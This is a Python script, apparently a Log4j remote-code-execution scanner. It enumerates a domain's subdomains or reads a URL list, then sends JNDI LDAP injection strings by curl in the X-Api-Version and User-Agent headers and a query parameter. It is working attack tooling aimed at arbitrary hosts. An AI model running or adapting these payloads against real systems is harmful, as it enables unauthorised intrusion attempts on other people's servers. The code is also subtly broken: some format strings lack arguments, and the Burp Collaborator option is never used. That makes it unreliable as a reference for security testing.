#!/usr/bin/env python3
import argparse
import subprocess

def does_command_exist(command):
    return subprocess.call(["command", "-v", command], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def check_required_commands(commands):
    missing_commands = [command for command in commands if not does_command_exist(command)]
    if missing_commands:
        print("\n\033[93mWarning: The following commands are required but not found on your system:\033[0m")
        for command in missing_commands:
            print("\033[93m{}\033[0m".format(command))
        print("\033[94m\nMore Info: https://github.com/PY-Log4j-RCE-Scanner\033[0m")
        exit()

def domain_scan(domain, burp_collab_id):
    required_commands = ["curl", "httpx", "assetfinder", "subfinder", "amass"]
    check_required_commands(required_commands)

    subdomains = set()
    subfinder_output = subprocess.check_output(["subfinder", "-silent", "-d", "sub." + domain]).decode().splitlines()
    assetfinder_output = subprocess.check_output(["assetfinder", "-subs-only", domain]).decode().splitlines()
    amass_output = subprocess.check_output(["amass", "enum", "-norecursive", "--silent", "-noalts", "-d", domain]).decode().splitlines()

    subdomains.update(subfinder_output)
    subdomains.update(assetfinder_output)
    subdomains.update(amass_output)

    for url in subdomains:
        url_without_protocol = url.replace("https://", "").replace("http://", "")
        url_without_protocol_and_port = url_without_protocol.split(":")[0]

        commands = [
            'curl -s --insecure --max-time 20 {} -H "X-Api-Version: \${{jndi:ldap://{}/a}}" > /dev/null'.format(url),
            'curl -s --insecure --max-time 20 {}/?test=\$\{{jndi:ldap://{}/a\}} > /dev/null'.format(url, url_without_protocol_and_port),
            'curl -s --insecure --max-time 20 {} -H "User-Agent: \${{jndi:ldap://{}/a}}" > /dev/null'.format(url)
        ]

        for command in commands:
            subprocess.run(command, shell=True)

        print("\033[104m[ DOMAIN ==> {} ]\033[0m".format(url))
        print("\n\033[92mMethod 1 ==> X-Api-Version: running-Ldap-payload")
        print("Method 2 ==> Useragent: running-Ldap-payload")
        print("Method 3 ==> {}/?test=running-Ldap-payload\033[0m".format(url))

def list_scan(url_list, burp_collab_id):
    required_commands = ["curl", "httpx"]
    check_required_commands(required_commands)

    with open(url_list, "r") as file:
        urls = file.read().splitlines()

    for url in set(urls):
        url_without_protocol = url.replace("https://", "").replace("http://", "")
        url_without_protocol_and_port = url_without_protocol.split(":")[0]

        commands = [
            'curl -s --insecure --max-time 20 {} -H "X-Api-Version: \${{jndi:ldap://{}/a}}" > /dev/null'.format(url),
            'curl -s --insecure --max-time 20 {}/?test=\$\{{jndi:ldap://{}/a\}} > /dev/null'.format(url, url_without_protocol_and_port),
            'curl -s --insecure --max-time 20 {} -H "User-Agent: \${{jndi:ldap://{}/a}}" > /dev/null'.format(url)
        ]

        for command in commands:
            subprocess.run(command, shell=True)

        print("\033[104m[ URL ==> {} ]\033[0m".format(url))
        print("\n\033[92mMethod 1 ==> X-Api-Version: running-Ldap-payload")
        print("Method 2 ==> Useragent: running-Ldap-payload")
        print("Method 3 ==> {}/?test=running-Ldap-payload\033[0m".format(url))

def main():
    parser = argparse.ArgumentParser(description="Log4j RCE Scanner")
    parser.add_argument("-d", "--domain", help="Scan a specific domain and its subdomains")
    parser.add_argument("-l", "--list", help="Scan a list of URLs")
    parser.add_argument("-b", "--burp", help="Burp Collaborator ID")
    args = parser.parse_args()

    if args.domain:
        domain_scan(args.domain, args.burp)
    elif args.list:
        list_scan(args.list, args.burp)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
